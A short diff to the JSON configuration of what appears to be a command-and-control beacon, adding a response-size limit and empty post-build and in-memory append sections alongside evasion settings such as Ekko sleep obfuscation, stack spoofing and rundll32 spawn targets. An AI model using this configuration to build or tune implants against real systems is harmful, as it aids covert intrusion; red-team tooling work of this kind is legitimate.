@@ -21,6 +21,7 @@
   "lazy_unhook": false,
   "pad": true,
   "pad_max": 1024,
+  "max_response_size": 67108864,
   "sleep_obfuscation": "ekko",
   "sleep_wipe_pe_headers": false,
   "sleep_stack_spoof": false,
@@ -80,6 +81,12 @@
   "spawnto": {
     "x64": "C:\\Windows\\System32\\rundll32.exe",
     "x86": "C:\\Windows\\SysWOW64\\rundll32.exe"
+  },
+  "post_build": {
+    "append": []
+  },
+  "in_memory_append": {
+    "append": []
   },
   "beacon_id": "04ef93eef0e0f069"
 }
